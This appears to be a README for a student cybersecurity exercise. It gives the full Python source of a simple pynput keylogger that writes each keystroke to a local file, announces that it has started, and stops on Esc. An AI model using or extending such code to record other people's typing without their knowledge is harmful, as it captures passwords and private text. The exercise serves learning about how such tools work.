# INSTALL REQUIRED PACKAGE:

If you haven't installed pynput, you'll need to install it using pip:

<img width="552" alt="Screenshot 2024-06-23 at 11 50 09 AM" src="https://github.com/VigneshwaranElakiya/PRODIGY_CS_04/assets/169158514/14d1c319-a0a9-46a3-80b0-f845ac413b2a">

# SOURCE CODE:
    
    from pynput.keyboard import Key, Listener

    log_file = "keylog.txt"

    def on_press(key):
        with open(log_file, "a") as log:
          try:
              log.write(f"{key.char}")
          except AttributeError:
              if key == Key.space:
                  log.write(" ")
              elif key == Key.enter:
                  log.write("\n")
              elif key == Key.tab:
                  log.write("\t")
              else:
                  log.write(f" [{key}] ")

    def on_release(key):
        if key == Key.esc:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        print("Keylogger started. Press 'Esc' to stop.")
        listener.join()
